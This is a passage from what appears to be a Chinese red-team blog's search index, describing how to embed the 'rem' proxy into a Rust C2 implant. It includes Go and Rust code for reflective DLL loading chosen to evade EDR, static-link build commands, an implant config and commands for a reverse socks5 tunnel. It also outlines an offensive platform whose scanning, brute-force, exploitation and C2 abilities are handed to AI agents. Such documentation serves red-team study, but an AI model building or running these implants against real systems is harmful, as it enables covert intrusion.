\u00a0 int srvpayloadLen = read_frame_sock(sock, srvpayload, PAYLOAD_MAX_SIZE);;\n\n\u00a0 \u00a0 /* \u542f\u52a8 Beacon */\n\u00a0 \u00a0 HANDLE handle_beacon = start_beacon(srvpayload, srvpayloadLen);\n</code></pre> <p></p> <p>\u8fd9\u6837\u5c31\u53ef\u4ee5\u590d\u7528\u521a\u624d\u63d0\u8fc7\u7684rem\u5b9e\u73b0\u7684\u5404\u79cd\u9690\u853d\u7684\u6d41\u91cf\u4fa7\u7279\u6027\u4e0e\u591a\u534f\u8bae\u4f20\u8f93\u5c42\u3002 \u5927\u5927\u62d3\u5c55\u4e86\u539f\u672cCS\u53ea\u652f\u6301DNS\u3001HTTP\u3001TCP\u7684\u4e09\u79cd\u4f20\u8f93\u5c42\u3002</p>"},{"location":"blog/todo/%E6%94%BB%E9%98%B2%E5%9C%BA%E6%99%AF%E4%B8%AD%E7%9A%84%E7%BD%91%E7%BB%9C%E4%BE%A7%E5%AF%B9%E6%8A%97%E9%9D%A9%E5%91%BD%20%28%E4%B8%8B%29---rem/#\u5d4c\u5165\u5230rust-implant\u4e2d","title":"\u5d4c\u5165\u5230rust implant\u4e2d","text":"<p>\u5982\u679c\u4e86\u89e3\u6211\u4eec\u5728\u5f00\u53d1\u7684\u53e6\u4e00\u4e2a\u9879\u76ee \u4e0b\u4e00\u4ee3\u8fdb\u653b\u6027\u57fa\u7840\u8bbe\u65bd---Internet of Malice \u5e94\u8be5\u65e9\u5df2\u770b\u5230IoM\u7684tunnel/proxy \u76f8\u5173\u529f\u80fd\u90fd\u4ea4\u7531rem\u5b9e\u73b0\u3002 </p> <p>\u800crem\u662f\u57fa\u4e8egolang\u5f00\u53d1\u7684\uff0c golang\u5728\u8fd9\u4e00\u5757\u7684\u751f\u6001\u5b8c\u6574\u5ea6\u8fdc\u8d85rust\u3002 \u90a3\u4e48\uff0c\u8be5\u5982\u4f55\u6253\u901arem\u4e0eIoM\u7684\u4ea4\u4e92\u5462\uff1f</p> <p>\u4f20\u7edf\u7684\u505a\u6cd5\uff0c\u4e0a\u4f20\u7136\u540e\u6267\u884c\u4e8c\u8fdb\u5236\u7a0b\u5e8f\uff0c\u53c8\u6216\u8005\u5c06\u5176\u6253\u5305\u6210dll/so\u968f\u7740implant\u6295\u9012\u3002 </p> <p>\u5bf9\u4e8eIoM\u6765\u8bf4\uff0c IoM\u63d0\u4f9b\u4e86\u53cd\u5c04\u52a8\u6001\u52a0\u8f7ddll\u4ee5\u53ca\u53cd\u5c04\u52a0\u8f7dPE\u7b49\u7b49\u529f\u80fd\uff0c \u6211\u4eec\u53ef\u4ee5\u57fa\u4e8e\u6211\u4eec\u7684\u8fdb\u653b\u6027\u57fa\u7840\u8bbe\u65bd\uff0c \u5b8c\u6210\u66f4\u52a0OPSEC\u7684\u52a0\u8f7d\u3002 </p>"},{"location":"blog/todo/%E6%94%BB%E9%98%B2%E5%9C%BA%E6%99%AF%E4%B8%AD%E7%9A%84%E7%BD%91%E7%BB%9C%E4%BE%A7%E5%AF%B9%E6%8A%97%E9%9D%A9%E5%91%BD%20%28%E4%B8%8B%29---rem/#\u65b9\u6cd51-\u53cd\u5c04\u52a0\u8f7dexe\u7a0b\u5e8f","title":"\u65b9\u6cd51 \u53cd\u5c04\u52a0\u8f7dEXE\u7a0b\u5e8f","text":"<p>rust implant\u7684execute_exe \u80fd\u5b8c\u7f8e\u52a0\u8f7drem\uff0c \u5c31\u50cf\u5728\u672c\u5730\u4f7f\u7528\u4e00\u6837\u3002 </p> <pre><code>execute_exe rem.exe -- -c [rem_link] ... \n</code></pre> <p>\u7f3a\u70b9\u662f\u4f1a\u6d3e\u751f\u65b0\u8fdb\u7a0b\uff0c \u5728\u6838\u6676\u6216\u8005EDR\u573a\u666f\u4e2d\uff0c \u4f1a\u7559\u4e0b\u66b4\u9732\u9762\u3002 </p>"},{"location":"blog/todo/%E6%94%BB%E9%98%B2%E5%9C%BA%E6%99%AF%E4%B8%AD%E7%9A%84%E7%BD%91%E7%BB%9C%E4%BE%A7%E5%AF%B9%E6%8A%97%E9%9D%A9%E5%91%BD%20%28%E4%B8%8B%29---rem/#\u65b9\u6cd52-\u52a8\u6001\u52a0\u8f7ddll","title":"\u65b9\u6cd52 \u52a8\u6001\u52a0\u8f7ddll","text":"<p>\u5148\u5c06rem\u6253\u6210dll\uff0c \u8fd9\u91cc\u9700\u8981\u7528\u5230Cgo\uff0c \u8de8\u8bed\u8a00\u7684\u4e92\u64cd\u4f5c\u5982\u679c\u8bed\u8a00\u6ca1\u6709\u63d0\u4f9b\u7279\u6b8a\u7684\u673a\u5236\uff0c \u5927\u591a\u57fa\u4e8eFFI\u5b9e\u73b0\u3002 </p> <p>\u8fd9\u6bb5\u4ee3\u7801\u66b4\u9732\u4e86\u4e00\u4e2a\u7c7b\u4f3c\u547d\u4ee4\u884c\u7a0b\u5e8f\u7684\u51fd\u6570\uff0c \u80fd\u63a5\u6536\u5b57\u7b26\u4e32\uff0c \u5e76\u89e3\u6790\u53c2\u6570\u6267\u884crem\u3002 </p> <p>https://github.com/chainreactors/rem-community/blob/master/cmd/export/main.go</p> <pre><code>//export RemDial\nfunc RemDial(cmdline *C.char) (*C.char, C.int) {\n    var option runner.Options\n    args, err := shellquote.Split(C.GoString(cmdline))\n    if err != nil {\n        utils.Log.Debugf(\"RemDial error: failed to split command line: %v\", err)\n        return nil, 1 // \u9519\u8befID 1: \u547d\u4ee4\u884c\u89e3\u6790\u9519\u8bef\n    }\n\n    err = option.ParseArgs(args)\n    if err != nil {\n        utils.Log.Debugf(\"RemDial error: failed to parse arguments: %v\", err)\n        return nil, 2 // \u9519\u8befID 2: \u53c2\u6570\u89e3\u6790\u9519\u8bef\n    }\n\n    ......\n\n    // \u542f\u52a8\u4e00\u4e2a\u65b0\u7684goroutine\u6765\u5904\u7406agent\n    go func() {\n        err := a.Handler()\n        if err != nil {\n            utils.Log.Error(err)\n        }\n        agent.Agents.Map.Delete(a.ID)\n    }()\n\n    for {\n        if a.Init {\n            break\n        } else {\n            time.Sleep(100 * time.Millisecond)\n        }\n    }\n\n    return C.CString(a.ID), 0 // \u6210\u529f\uff0c\u8fd4\u56deagent ID\n}\n</code></pre> <pre><code>go build -buildmode=c-shared -o dist/rem.dll -ldflags \"-s -w\" -buildvcs=false .\\cmd\\export\\\n</code></pre> <p>\u8fd9\u4e2a\u662fFFI\u7684\u516c\u5934\uff0c \u5728rust\u4e2d\u5b9e\u73b0\u5bf9\u5e94\u7684\u6bcd\u5934\uff0c \u4f46\u662f\u7565\u5fae\u4e0d\u540c\u7684\u662f\uff0c \u6211\u4eec\u4e0d\u4f1a\u91c7\u7528\u539f\u59cb\u7684\u52a0\u8f7dDLL\u7684\u65b9\u5f0f\uff0c\u800c\u662f\u66f4\u52a0OPSEC\u7684\u53cd\u5c04\u52a0\u8f7d\u3002  https://github.com/chainreactors/malefic/blob/master/malefic-helper/src/common/rem/rem_reflection.rs</p> <p><pre><code>#[cfg(target_os = \"windows\")]  \n#[cfg(feature = \"prebuild\")]  \npub unsafe fn load_module(bins: Vec&lt;u8&gt;, bundle: String) -&gt; Result&lt;*const c_void, CommonError&gt; {  \n    use crate::win::kit::{MaleficLoadLibrary, AUTO_RUN_DLL_MAIN, LOAD_MEMORY};  \n\n    if bins.is_empty() || bundle.is_empty() {  \n        return Err(ArgsError(obfstr!(\"bins or bundle is empty :)\").to_string()));  \n    }  \n    let new_bundle = format!(\"{}{}\", bundle, \"\\x00\");  \n    let dark_module = MaleficLoadLibrary(  \n        AUTO_RUN_DLL_MAIN | LOAD_MEMORY as u32,  \n        null(),  \n        bins.as_ptr() as _,  \n        bins.len(),  \n        new_bundle.as_ptr() as _,  \n    ) as _;  \n\n    Ok(dark_module)  \n}\n\n#[cfg(target_os = \"windows\")]  \n#[cfg(feature = \"prebuild\")]  \npub unsafe fn get_function_address(module_base: *const c_void, function_name: &amp;str) -&gt; *const c_void {  \n    use crate::win::kit::MaleficGetFuncAddrWithModuleBaseDefault;  \n\n    MaleficGetFuncAddrWithModuleBaseDefault(  \n        module_base,  \n        function_name.as_ptr(),  \n        function_name.len(),  \n    )  \n}\n\n\n// \u53cd\u5c04\u52a0\u8f7ddll\u5e76\u89e3\u6790\u5bf9\u5e94\u7684\u51fd\u6570\nunsafe fn initialize_functions() -&gt; Result&lt;(), String&gt; {  \n    let dll_bytes = REM_DLL  \n        .get()  \n        .ok_or(\"REM not initialize, please load rem.dll\")?;  \n\n    let module = load_module(dll_bytes.clone(), String::from(\"rem\"))  \n        .map_err(|e| format!(\"Failed to load module: {:?}\", e))?;  \n\n    if module.is_null() {  \n        return Err(\"Failed to load module: module is null\".to_string());  \n    }  \n\n    let module_base = module as *const _;  \n\n    // \u83b7\u53d6\u5404\u4e2a\u51fd\u6570\u7684\u5730\u5740  \n    let rem_dial_addr = get_function_address(module_base, \"RemDial\");  \n    if rem_dial_addr.is_null() {  \n        return Err(\"Failed to get RemDial function\".to_string());  \n    }  \n    REM_FUNCTIONS.rem_dial = Some(std::mem::transmute(rem_dial_addr));\n    Ok(())\n}\n</code></pre> \u5bf9\u5e94\u5de5\u5177\u51fd\u6570\u5df2\u7ecf\u5728IoM\u4e2d\u5b9e\u73b0\uff0c \u4e5f\u53ef\u4ee5\u5c06\u5176\u4ed6FFI\u7a0b\u5e8f\u901a\u8fc7\u7c7b\u4f3c\u7684\u65b9\u6cd5\u5b9e\u73b0\u3002</p> <p>\u66b4\u9732REM\u51fd\u6570 <pre><code>extern \"C\" {\n    fn RemDial(cmdline: *const c_char) -&gt; (*mut c_char, c_int);\n    fn MemoryDial(memhandle: *const c_char, dst: *const c_char) -&gt; (c_int, c_int);\n    fn MemoryRead(handle: c_int, buf: *mut c_void, size: c_int) -&gt; (c_int, c_int);\n    fn MemoryWrite(handle: c_int, buf: *const c_void, size: c_int) -&gt; (c_int, c_int);\n    fn MemoryClose(handle: c_int) -&gt; c_int;\n    fn CleanupAgent();\n}\n</code></pre></p> <p>\u5bf9\u4e8e\u4f7f\u7528\u8005\u6765\u8bf4\uff0c \u4e0d\u9700\u8981\u5173\u6ce8\u8fd9\u4e9b\u7ec6\u8282\uff0c \u76f8\u5173\u4ee3\u7801\u5df2\u7ecf\u5728[IoM\u7684\u63d2\u4ef6\u4ed3\u5e93]https://github.com/chainreactors/mal-community/blob/master/community-proxy/modules/rem.lua ()\u4e2d\u5b8c\u6210\u4e86\u5bf9\u5e94\u7684\u5c01\u88c5\u3002</p> <p>\u5728IoM\u547d\u4ee4\u884c\u4e2d\u6267\u884c\u4ee5\u4e0b\u4ee3\u7801\u5373\u53ef\u5b89\u88c5\u5e76\u4f7f\u7528rem <pre><code># \u5b89\u88c5\u5bf9\u5e94\u7684\u63d2\u4ef6\nmal install community-proxy\n\n# \u52a0\u8f7drem dll\nrem_community load\n\n# \u9009\u62e9\u5bf9\u5e94\u7684rem pipeline, \u642d\u5efa\u4e86\u53cd\u5411\u4ee3\u7406\u96a7\u9053\nrem_community socks5 rem_pipeline\n</code></pre></p> <p>\u8fd9\u4e2a\u65b9\u6cd5\u6bd4<code>execute-exe</code>\u597d\u7684\u5730\u65b9\u5728\u4e8e\uff0c \u4e0d\u4f1a\u6709\u65b0\u8fdb\u7a0bfork\uff0c \u4e00\u5207\u90fd\u5728\u5f53\u524d\u8fdb\u7a0b\u4e2d\u5b8c\u6210\u3002 </p>"},{"location":"blog/todo/%E6%94%BB%E9%98%B2%E5%9C%BA%E6%99%AF%E4%B8%AD%E7%9A%84%E7%BD%91%E7%BB%9C%E4%BE%A7%E5%AF%B9%E6%8A%97%E9%9D%A9%E5%91%BD%20%28%E4%B8%8B%29---rem/#\u65b9\u6cd53-\u9759\u6001\u94fe\u63a5rem","title":"\u65b9\u6cd53 \u9759\u6001\u94fe\u63a5rem","text":"<p>\u65b9\u6cd51\u548c2\u90fd\u662f\u89e3\u51b3\u4e0a\u7ebf\u540e\u8fdb\u4e00\u6b65\u642d\u5efaproxy/tunnel\uff0c\u8981\u60f3\u8ba9implant\u76f4\u63a5\u901a\u8fc7rem\u642d\u5efa\u7684\u4fe1\u9053\u8fdb\u884c\u6240\u6709\u901a\u8baf\uff0c\u8fd8\u9700\u8981\u4e00\u4e9b\u6280\u5de7\u3002 </p> <p>\u4f7f\u7528\u521a\u521a\u5b9e\u73b0\u7684rem\u7684/cmd/export/main.go , \u53ea\u9700\u8981\u4fee\u6539\u4e0b\u7f16\u8bd1\u547d\u4ee4\uff0c \u5c31\u80fd\u751f\u6210\u9759\u6001\u94fe\u63a5\u5e93\u7ed9rust\u4f7f\u7528\u3002</p> <pre><code>go build -buildmode=c-archive -o dist/rem.a -ldflags \"-s -w\" -buildvcs=false .\\cmd\\export\\\n</code></pre> <p>\u5728rust\u4e2d\u5b9e\u73b0\u5bf9\u5e94\u7684\u94fe\u63a5, \u590d\u7528\u65b9\u6cd52\u4e2d\u7684rust\u5b9a\u4e49\u5373\u53ef\u3002 </p> <p>https://github.com/chainreactors/malefic/blob/master/malefic-helper/build.rs <pre><code>#[cfg(feature = \"rem_static\")]  \n{  \n    let resources_path = PathBuf::from(env!(\"CARGO_MANIFEST_DIR\"))  \n        .parent()  \n        .unwrap()  \n        .join(\"resources\");  \n\n    let target_os = env::var(\"CARGO_CFG_TARGET_OS\").unwrap();  \n    let target_arch = env::var(\"CARGO_CFG_TARGET_ARCH\").unwrap();  \n\n    let rem_config = LibraryConfig::new(  \n        \"REM\",  \n        vec![\"windows\", \"linux\"],  \n        vec![\"x86_64\"],  \n        \"librem_community_{os}_{arch}.a\",  \n        vec![\"ws2_32\", \"userenv\"],  \n    );  \n\n    if let Err(e) = rem_config.link_library(&amp;resources_path, &amp;target_os, &amp;target_arch) {  \n        panic!(\"{}\", e);  \n    }  \n}\n</code></pre></p> <p>\u5b9e\u73b0\u5bf9\u5e94\u7684implant transport\uff0c\u89c1: https://github.com/chainreactors/malefic/blob/master/malefic-core/src/transport/rem/mod.rs</p> <p>\u5bf9\u4e8e\u4f7f\u7528\u8005\u6765\u8bf4\uff0c \u4fee\u6539implant \u7684config.yaml</p> <pre><code>basic:  \n  name: \"malefic\"  \n  targets:  \n    - \"127.0.0.1:5001\"  \n  protocol: \"rem\"  \n  tls: false  \n  proxy: \"\"  \n  interval: 5  \n  jitter: 0.2  \n  ca:  \n  encryption: aes  \n  key: maliceofinternal  \n  rem:  \n    link: '[rem_link]'\n</code></pre> <p>\u8fd0\u884cmutant\u751f\u6210\u7f16\u8bd1\u914d\u7f6e\u5e76\u7f16\u8bd1</p> <pre><code>malefic-mutant generate beacon\n\ncargo build --release -p malefic\n</code></pre>"},{"location":"blog/todo/%E6%94%BB%E9%98%B2%E5%9C%BA%E6%99%AF%E4%B8%AD%E7%9A%84%E7%BD%91%E7%BB%9C%E4%BE%A7%E5%AF%B9%E6%8A%97%E9%9D%A9%E5%91%BD%20%28%E4%B8%8B%29---rem/#\u7ed3\u8bed","title":"\u7ed3\u8bed","text":"<p>rem\u5b9e\u9645\u4e0a\u5df2\u7ecf\u91cd\u6784\u4e864\u6b21\uff0c\u4e0d\u65ad\u7684\u62d3\u5c55\u80fd\u529b\u7684\u8fb9\u754c\uff0c \u5df2\u7ecf\u4e0d\u662f\u4e00\u4e2a\u5355\u7eaf\u7684\u4ee3\u7406\u5de5\u5177\uff0c\u800c\u662f\u5f00\u53d1\u6846\u67b6\u3002 </p> <p>\u5728\u53d1\u5e03\u65f6\uff0c \u6211\u8003\u8651\u4e86\u5f88\u957f\u65f6\u95f4\u5982\u4f55\u53bb\u6389\u4e00\u4e9b\u5177\u6709\u8fc7\u5f3a\u653b\u51fb\u6027\u7684\u80fd\u529b\u53c8\u4e0d\u5f71\u54cd\u5176\u67b6\u6784\u3002\u76ee\u524d\u53d1\u5e03\u7684\u7248\u672c\u5305\u542b\u4e86\u6240\u6709\u7684\u57fa\u672c\u529f\u80fd\uff0c\u4f46\u5728\u4e00\u4e9b\u7279\u6b8a\u7684\u6a21\u5757\u4e0a\u6ca1\u6709\u5bf9\u5916\u66b4\u9732\u6216\u8005\u9700\u8981\u624b\u52a8\u914d\u7f6e\u53c8\u6216\u8005\u9700\u8981\u7b80\u5355\u4e8c\u5f00(cursor\u5c31\u53ef\u4ee5\u5b8c\u7f8e\u80dc\u4efb)\u3002 </p> <p>\u7f51\u7edc\u4fa7\u7684\u653b\u9632\u4e5f\u4e0d\u4ec5\u9650\u4e8e\u672c\u6587\u63d0\u5230\u7684\u5185\u5bb9\uff0c \u5b9e\u9645\u4e0a\u8fd8\u6709\u66f4\u591a\u7684\u73a9\u6cd5\u548c\u601d\u8def\u3002</p>"},{"location":"blog/todo/%E8%BF%9B%E6%94%BB%E6%80%A7%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD/","title":"\u8fdb\u653b\u6027\u57fa\u7840\u8bbe\u65bd","text":""},{"location":"blog/todo/%E8%BF%9B%E6%94%BB%E6%80%A7%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD/#\u67b6\u6784","title":"\u67b6\u6784","text":"<p>\u7cfb\u7edf\u67b6\u6784\u5206\u4e3a\u4e09\u5c42</p> <ul> <li>\u8fdb\u653b\u578b\u57fa\u7840\u8bbe\u65bd\u5c42\uff08Offensive Infrastructure\uff09\uff0c \u57fa\u4e8e\u5b9e\u6218\u73af\u5883\u5b9e\u73b0\u7684\u8fdb\u653b\u6027\u57fa\u7840\u8bbe\u65bd\uff0c \u5305\u62ec\u5916\u7f51\u7684\u5206\u5e03\u5f0f\u57fa\u7840\u8bbe\u65bd\uff0c \u5927\u91cf\u626b\u63cf\u80fd\u529b\u5de5\u4ef6\uff0c\u57fa\u4e8eIoM\u5b9e\u73b0\u7684\u4e0b\u4e00\u4ee3C2\u5de5\u5177\u3002 \u63d0\u4f9b\u4ecePre-Exploit \u5230Post-Expolit\u7684\u5168\u8fc7\u7a0bReal World\u80fd\u529b</li> <li>CTEM\u5c42\uff08\u653b\u9632\u4e00\u4f53\u4e24\u9762\uff0c \u53ef\u5f62\u6210\u4f01\u4e1a\u5b89\u5168\u80fd\u529b\u5efa\u8bbe\u7684\u5e73\u53f0\uff0c \u4e5f\u53ef\u4f5c\u4e3a\u4e00\u4f53\u5316\u653b\u51fb\u5e73\u53f0\uff09\uff0c \u5305\u542b\u4e24\u4e2a\u5b50\u5e73\u53f0<ul> <li>ASM/\u81ea\u52a8\u5316\u6e17\u900f\u5e73\u53f0\uff0c \u8d1f\u8d23pre-exploit \u5230exploit\u9636\u6bb5</li> <li>BAS \u653b\u51fb\u5165\u4fb5\u548c\u6a21\u62df\uff0c \u8d1f\u8d23exploit\u5230post-exploit\u9636\u6bb5</li> </ul> </li> <li>AI agent\u5c42\uff0c \u57fa\u7840\u8bbe\u65bd\u5c42\u7684\u80fd\u529b\u5c06\u63d0\u4f9b\u7ed9AI agent\u3002</li> </ul>"},{"location":"blog/todo/%E8%BF%9B%E6%94%BB%E6%80%A7%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD/#\u57fa\u7840\u8bbe\u65bd\u5c42","title":"\u57fa\u7840\u8bbe\u65bd\u5c42","text":"<p>\u53c2\u8003\u6211\u4e4b\u524d\u7684\u9879\u76eemapping \u66b4\u9732\u9762\u7ba1\u7406 \u3002mapping\u4e3b\u8981\u7528\u6765\u89e3\u51b3\u5916\u7f51\u81ea\u52a8\u5316\u4fe1\u606f\u6536\u96c6\u4e0e\u6e17\u900f\u7684\u95ee\u9898\u3002</p> <p>\u91c7\u7528\u4e86\u5b8c\u5168\u89e3\u8026\u7684\u8bbe\u8ba1\uff0c\u6570\u636e\u3001\u80fd\u529b\u3001\u6267\u884c\u662f\u4e09\u4e2a\u5b8c\u5168\u72ec\u7acb\u7684\u7ec4\u4ef6\uff0c \u4e92\u76f8\u89e3\u8026\u5e76\u5747\u53ef\u62d3\u5c55\u3002</p> <p></p> <p>\u57fa\u7840\u8bbe\u65bd\u5c42\u7531 worker \u4e0e \u5143\u80fd\u529b\u6784\u6210\u3002 \u5728\u4e2d\u95f4\u8fd8\u6dfb\u52a0\u4e86\u4e00\u4e9b\u62bd\u8c61\u3002</p> <ul> <li>\u5de5\u4f5c\u5b9e\u4f53 \uff08Entity\uff09\uff0c \u6bcf\u4e2aEntity\u90fd\u4f1a\u5bf9\u5e94\u81f3\u5c11\u4e00\u4e2aCapability\u3002\u81ea\u52a8\u5316\u90e8\u7f72worker\uff0c \u53ef\u4ee5\u662fdocker \uff0cecs\uff0c \u4e91\u51fd\u6570\u3002 \u4e5f\u53ef\u4ee5\u662frpc\uff0c\u8fd0\u7ef4\u7ba1\u9053\uff0c api\u3002 \u4e0d\u9650\u5236\u5f62\u5f0f\u3002<ul> <li>\u5de5\u4ef6\uff08Artifact\uff09\uff0c\u57fa\u7840\u8bbe\u65bd\u5c42\u4e3b\u4f53\u57fa\u4e8epython\u5b9e\u73b0\uff0c\u4f46\u793e\u533a\u4e2d\u5df2\u7ecf\u6709\u5927\u91cf\u6210\u719f\u7684\u5de5\u5177\u79ef\u7d2f\u3002 Capability\u5b9e\u9645\u4e0a\u53ea\u662f\u5bf9\u73b0\u6709\u5de5\u5177\u94fe\u8fdb\u884c\u62bd\u8c61\uff0c \u5c06\u5176\u5c01\u88c5\u4e3arpc\u3002\u4f8b\u5982projectdiscovery\u4e2d\u7684\u5927\u91cf\u5de5\u5177\u3002</li> <li>\u57fa\u7840\u8bbe\u65bd\uff08Infrastructure\uff09\uff0c \u540c\u4e00\u4e2aArtifact\u53ef\u4ee5\u5728\u4e0d\u540c\u573a\u666f\u4e2d\u5de5\u4f5c\u3002 \u5982\u679c\u662f\u5185\u7f51\u5219\u662f\u5728docker\u4e2d\uff0c\u5982\u679c\u662f\u5916\u7f51\u5219\u5728\u4e91\u51fd\u6570\u6216\u8005ECS\u4e2d\u3002 \u8fd9\u4e2a\u90e8\u7f72\u8fc7\u7a0b\u4e5f\u9700\u8981\u662f\u81ea\u52a8\u5316\u7684\u3002</li> </ul> </li> <li>\u80fd\u529b\uff08Capability\uff09\uff0c \u80fd\u529b\u9700\u8981\u627f\u8f7d\u5728\u5de5\u4f5c\u5b9e\u4f53\u4e0a\uff0c \u4f8b\u5982gogo\u626b\u63cf\u5668\uff0c \u9700\u8981\u5728docker\u3001\u4e91\u51fd\u6570\u3001ECS\u4e0a\u8fd0\u884c\u3002<ul> <li>\u5143\u80fd\u529b\uff08Ability\uff09\uff0c\u80fd\u529b\u7684\u6700\u5c0f\u5355\u4f4d\uff0c Capability\u5bf9\u5e94\u4e00\u7ec4Ability\u3002\u5728\u5b9e\u73b0\u4e2d\uff0c\u6211\u4eec\u4f1a\u4e00\u6b21\u6027\u90e8\u7f72\u591a\u4e2a\u5de5\u4ef6\u5230\u5de5\u4f5c\u5b9e\u4f53\u4e0a\u3002 \u4ee5\u76ee\u524d\u5df2\u7ecf\u5b9e\u73b0\u7684Serverless Capability\uff0c \u62e5\u6709 gogo\u3001 zombie\u3001nuclei\u7b49\u7b49\u3002\u5c06Artifact\u8fdb\u884c\u5c01\u88c5\u5230\u7cfb\u7edf\u540e\u5c31\u79f0\u4e4b\u4e3aAbility\u3002Artifact \u90e8\u7f72\u5728Entity\u4e0a\uff0c \u5e76\u5bf9\u5916\u66b4\u9732\u51fa\u7684rpc \u79f0\u4e4b\u4e3a Ability\u3002</li> <li>\u4efb\u52a1\uff08Task\uff09\uff0c\u5bf9\u5e94ATT&amp;CK\u4e2d\u7684**Procedure\u3002** \u62e5\u6709\u4e86Ability\u540e\uff0c \u8fd8\u9700\u8981\u5c06\u5176\u6ce8\u518c\u5230\u5de5\u4f5c\u6d41\u5f15\u64ce\u4e2d\u3002 \u8fd9\u4e2a\u6ce8\u518c\u53ef\u4ee5\u662f\u81ea\u52a8\u7684\uff0c \u4e5f\u53ef\u4ee5\u662f\u624b\u52a8\u7684\u3002 \u5728\u5b9e\u9645\u6267\u884c\u7684\u8fc7\u7a0b\u4e2d\uff0c \u6211\u4eec\u9700\u8981\u4f7f\u7528gogo\u8fdb\u884c\u4e00\u6b21\u626b\u63cf\uff0c \u5b9e\u9645\u4e0a\u5c31\u662f\u8c03\u7528Task\uff0c **Task**\u4f1a\u8c03\u7528**Ability\uff08\u5373Artifact \u90e8\u7f72\u5728Entity\u4e0a\uff0c \u5e76\u5bf9\u5916\u66b4\u9732\u51fa\u7684rpc \uff09\u3002**\u5728\u5de5\u4f5c\u6d41\u5c42\u9762\uff0c\u6211\u4eec\u4e0d\u9700\u8981\u5173\u7cfbgogo\u662f\u5982\u4f55\u5de5\u4f5c\u7684\u3002 \u6211\u4eec\u53ea\u9700\u8981\u8c03\u7528Task\u5373\u53ef\u3002</li> </ul> </li> <li>\u5de5\u4f5c\u8282\u70b9\uff08Worker\uff09\uff0c \u6bcf\u4e2aWorker \u81f3\u5c11\u62e5\u6709\u4e00\u4e2aCapability\u3002 \u5c06\u4f1a\u5411\u7ba1\u7406\u7aef\u6ce8\u518c\u81ea\u8eab\uff0c \u544a\u77e5\u7ba1\u7406\u7aef\u5176\u5f53\u524d\u7684\u80fd\u529b\u8fb9\u754c\u4e0e\u6027\u80fd\u7b49\u3002 \u6240\u6709\u7684\u5143\u80fd\u529b\u90fd\u5c06\u5728Worker\u4e0a\u5411\u5916\u90e8\u63d0\u4f9b\u3002 \u5bf9\u4e8eCTEM\u4e0eAI agent\u4e0d\u9700\u8981\u5173\u5fc3\u5176\u5177\u4f53\u5b9e\u73b0\uff0c\u751a\u81f3\u4e0d\u9700\u8981\u5173\u5fc3\u6027\u80fd\u4e0e\u6267\u884c\u60c5\u51b5\u3002</li> <li>\u534f\u4f5c\u5e73\u53f0\uff08TeamServer\uff09\uff0c\u8fd9\u539f\u672c\u662fC2\u4e2d\u5e38\u7528\u7684\u6982\u5ff5\uff0c\u4f46\u5728\u7edd\u5927\u90e8\u5206\u81ea\u52a8\u5316\u6e17\u900f\u5de5\u5177\u4e2d\u90fd\u5ffd\u89c6\u4e86\u8fd9\u65b9\u9762\u7684\u80fd\u529b\u3002\u5982\u679c\u8981\u63d0\u4f9b\u6e17\u900f\u57fa\u7840\u8bbe\u65bd\uff0c\u90a3\u4e48\u5c31\u4e0d\u80fd\u53ea\u63d0\u4f9b\u5355\u70b9\u7684\u96f6\u788e\u7684\u5de5\u5177\uff0c\u4e0d\u7136\u4e0ekali\u5e76\u65e0\u533a\u522b\u3002 \u6211\u4eec\u9700\u8981\u4e00\u4e2a\u8d1f\u8d23\u4efb\u52a1\u8c03\u5ea6\uff0c worker\u7ba1\u7406\uff0c \u6570\u636e\u540c\u6b65\uff0c \u7ecf\u9a8c\u79ef\u7d2f\u3002\u66f4\u4e3a\u91cd\u8981\u7684\u539f\u56e0\u662f\uff0c TeamServer\u4e2d\u7684Team\u6210\u5458\u53ef\u4ee5\u662f\u4eba\u7c7b\uff0c \u4e5f\u53ef\u4ee5\u662fAI\u3002<ul> <li>\u5206\u5e03\u5f0f\u8c03\u5ea6\uff0c \u5bf9\u4e8eCTEM\u548cAI Agent \u4e0a\u4e0d\u518d\u9700\u8981\u5173\u6ce8\u4efb\u52a1\u8c03\u5ea6\uff0c \u4f7f\u7528\u8005\u53ea\u9700\u8981\u8d1f\u8d23\u5206\u53d1\u4efb\u52a1</li> <li>\u6570\u636e\u540c\u6b65\uff0c</li> <li>\u77e5\u8bc6\u5e93 \uff08Knowledge database\uff09</li> <li>\u6307\u7eb9\u5e93</li> <li>\u6f0f\u6d1e\u5e93</li> <li>\u6587\u6863\u5e93</li> <li>......</li> </ul> </li> </ul> <p>\u57fa\u7840\u8bbe\u65bd\u90e8\u5206\u5c06\u63d0\u4f9b\u591a\u4e2a\u7ec4\u4ef6\uff0c \u5171\u540c\u7ec4\u6210\u8fdb\u653b\u6027\u57fa\u7840\u8bbe\u65bd\u3002 \u4e5f\u53ef\u4ee5\u53ea\u4f7f\u7528worker\u90e8\u5206\u7684\u80fd\u529b\uff0c\u81ea\u5efateamserver\u3002</p> <ul> <li>worker \uff0c\u5de5\u4f5c\u8282\u70b9\uff0c \u63d0\u4f9b\u5143\u80fd\u529b<ul> <li>\u7aef\u53e3\u626b\u63cf</li> <li>\u76ee\u5f55\u7206\u7834</li> <li>\u53e3\u4ee4\u7206\u7834</li> <li>\u6307\u7eb9\u8bc6\u522b</li> <li>\u6f0f\u6d1e\u9a8c\u8bc1</li> <li>\u6f0f\u6d1e\u5229\u7528</li> <li>C2</li> <li>webshell</li> <li>\u4ee3\u7406</li> </ul> </li> <li>api/sdk, \u5bf9\u5916\u63d0\u4f9b\u529f\u80fd\u66b4\u9732</li> <li>infrastructure, \u81ea\u52a8\u5316\u90e8\u7f72\u5b9e\u4f53\u57fa\u7840\u8bbe\u65bd</li> <li>teamserver<ul> <li>database\uff0c \u6570\u4ed3</li> <li>linker\uff0c \u6570\u636e\u5173\u8054</li> </ul> </li> </ul> <p>\u57fa\u7840\u8bbe\u65bd\u5c42\u5c06\u59cb\u7ec8\u4e0e AI agent\u4ee5\u53caCTEM\u4fdd\u6301\u6b63\u4ea4\u3002 \u4f5c\u4e3a\u80fd\u529b\u63d0\u4f9b\u8005\uff0c\u4ea4\u4ed8\u4eba\u7c7b\u53ef\u7528\uff0cCTEM\u53ef\u7528\uff0c AI 